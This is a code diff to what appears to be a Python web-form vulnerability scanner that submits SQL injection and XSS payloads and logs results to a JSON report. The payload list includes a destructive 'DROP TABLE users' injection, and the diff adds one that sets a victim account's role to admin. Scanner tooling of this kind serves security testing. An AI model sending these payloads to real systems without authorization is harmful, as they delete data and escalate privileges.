@@ -8,7 +8,8 @@ import json
 init(autoreset=True)
 
 sql_payloads = [
-    "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users; --"
+    "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users; --",
+    "abc'; UPDATE users SET role='admin' WHERE username='victim'; --"
 ]
 xss_payloads = [
     "<script>alert('XSS')</script>", "'\"><script>alert('XSS')</script>"
@@ -71,7 +72,7 @@ def scan_form(form_details, url):
             else:
                 res = requests.get(action, params=data)
             if is_vulnerable(res, baseline):
-                risk = "High" if "drop" in payload.lower() else "Medium"
+                risk = "High" if any(kw in payload.lower() for kw in ["drop", "update", "delete"]) else "Medium"
                 print(Fore.RED + f"[!] Possible SQL Injection detected ({method.upper()}) with payload: {payload} [Risk: {risk}]")
                 results.append({
                     "url": action,
@@ -123,7 +124,6 @@ def scan(url):
 
     if not results:
         print(Fore.GREEN + "[✓] No vulnerabilities detected in any form.")
-
     else:
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         with open(f"report_{timestamp}.json", "w") as f:
